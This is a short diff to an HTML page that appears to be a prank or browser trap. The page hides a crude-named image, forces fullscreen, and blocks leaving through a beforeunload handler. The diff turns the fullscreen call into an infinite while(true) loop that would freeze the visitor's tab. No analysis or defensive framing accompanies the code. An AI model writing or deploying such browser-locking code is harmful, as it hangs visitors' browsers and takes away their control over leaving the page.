@@ -5,7 +5,7 @@
 <img style="visibility: hidden;" id="aaa" src="fuckin gif image.gif" height="100%"></img>
 <script>
 function alertloop() {
-    ele.requestFullscreen();
+    while(true) ele.requestFullscreen();
 }
 function ggg() {
     setTimeout(alertloop, 1000);
@@ -23,15 +23,6 @@ window.addEventListener('beforeunload', function (event) {
   event.preventDefault() // (1)
   event.returnValue = '' // (2)
 })
-</script>
-<script>
-document.addEventListener(
-  'touchmove',
-  (event: any) => {
-    event.preventDefault();
-  },
-  { passive: false },
-);
 </script>
 <style>
 * {
